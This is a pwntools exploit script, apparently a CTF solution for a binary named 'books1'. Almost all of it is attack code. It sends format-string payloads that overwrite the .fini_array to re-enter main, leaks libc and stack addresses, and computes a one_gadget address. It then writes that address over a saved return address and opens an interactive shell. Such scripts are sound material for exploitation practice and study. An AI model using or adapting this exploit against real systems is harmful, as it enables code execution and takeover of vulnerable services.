#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./books1')
libc = ELF('libc.so.6')
p = process('./books1')

def edit1(content):
    p.recvuntil('5: Submit\n')
    p.sendline('1')
    p.recvuntil('order:\n')
    p.sendline(content)

def edit2(content):
    p.recvuntil('5: Submit\n')
    p.sendline('2')
    p.recvuntil('order:\n')
    p.sendline(content)

def delete1():
    p.recvuntil('5: Submit\n')
    p.sendline('3')

def delete2():
    p.recvuntil('5: Submit\n')
    p.sendline('4')

def show():
    p.recvuntil('5: Submit\n')
    p.sendline('5')

def debug():
    gdb.attach(p)
    pause()

# hijack_fini_array
main_addr = 0x400A39 # 0x400830
delete2()
payload = b'%' + str(2617-12).encode() + b'c' + b'%13$hn' + b'bbbbbbb%31$p' +b'%33$p'
payload = payload.ljust(0x80,b'1')
payload += p64(0)+p64(0x151)

edit1(payload)# 0x90 padding

#show()# 0x80+19 0x93

fini_array_addr = 0x6011B8
p.recvuntil('5: Submit\n')
payload = b'5' + b'a'*7 + p64(fini_array_addr)# %13$p
p.sendline(payload)

p.recvuntil('b'*7)
p.recvuntil('b'*7)
p.recvuntil('b'*7)
__libc_start_main_addr = int(p.recv(14)[2:],16) - 240
log.success('__libc_start_main_addr: ' + hex(__libc_start_main_addr))

stack_addr = int(p.recv(14)[2:],16)
log.success('stack_addr: ' + hex(stack_addr))

libc.address = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success('libc.address: ' + hex(libc.address))

one_addr = libc.address + 0x45216
log.success('one_addr: ' + hex(one_addr))


# hijack_free_got

delete2()
a = ((one_addr>>16)&0xff)
b = (one_addr&0xffff)

payload = b'%' + str(a-12).encode() + b'c' + b'%14$hhn'
payload += b'%' + str(b-a).encode() + b'c' + b'%13$hn'
# payload = b'%' + str(b-12).encode() + b'c' + b'%13$hn'
# payload += b'%' + str(a-b+65536).encode() + b'c' + b'%14$hhn'
payload = payload.ljust(0x80,b'1')
payload += p64(0)+p64(0x151)
# debug()
edit1(payload)# 0x90 padding


ret_addr = stack_addr-0x1f0
p.recvuntil('5: Submit\n')
payload = b'5' + b'a'*7 + p64(ret_addr) + p64(ret_addr+2)# %13$p

p.sendline(payload)

p.interactive()
